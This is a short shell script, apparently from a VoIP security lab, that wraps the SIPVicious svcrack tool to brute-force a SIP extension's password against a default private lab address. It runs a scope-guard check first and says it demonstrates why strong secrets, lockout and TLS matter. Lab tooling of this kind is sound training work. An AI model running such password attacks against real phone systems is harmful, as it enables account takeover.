#!/bin/sh
# lab-crack [target] [extension] [extra svcrack args] — password attack (SIPVicious svcrack).
# M16 (threat T3). Shows why strong secrets + lockout + TLS matter. Scope-guarded.
# Example: lab-crack 172.28.10.10 1001 -r 1000-9999
. /opt/redteam/scripts/_guard.sh
TARGET="${1:-172.28.10.10}"
EXT="${2:-1001}"
voipsec_guard "$TARGET"
shift 2>/dev/null || true; shift 2>/dev/null || true
echo "[lab-crack] svcrack -u $EXT $TARGET ${*} (authorized lab)"
exec svcrack -u "$EXT" "$@" "$TARGET"
